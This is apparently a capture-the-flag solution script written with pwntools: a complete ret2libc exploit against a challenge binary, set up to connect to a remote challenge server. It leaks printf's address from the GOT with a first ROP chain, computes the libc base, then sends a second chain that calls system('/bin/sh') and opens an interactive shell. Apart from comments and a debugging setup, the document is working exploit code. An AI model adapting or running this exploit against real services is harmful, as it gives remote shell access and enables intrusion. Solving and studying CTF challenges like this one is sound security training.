#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.101.174.85', 10007

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

offset = 9
payload = flat({
    offset: [
        rop.rdi.address,
        elf.got['printf'],
        rop.ret.address,
        elf.plt['printf'],
        rop.ret.address,
        elf.sym['main']
    ]
})

io.sendlineafter(b'>', payload)
leak = unpack(io.recvuntil(b'well,', drop=True).strip().ljust(8, b'\x00'))

libc.address = leak - libc.sym['printf']
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

info("printf: %#x", leak)
info("libc base: %#x", libc.address)
info("binsh: %#x", binsh)
info("system: %#x", system)

payload = flat({
    offset: [
        rop.rdi.address,
        binsh,
        rop.ret.address,
        system
    ]
})

io.sendlineafter(b'>', payload)
io.interactive()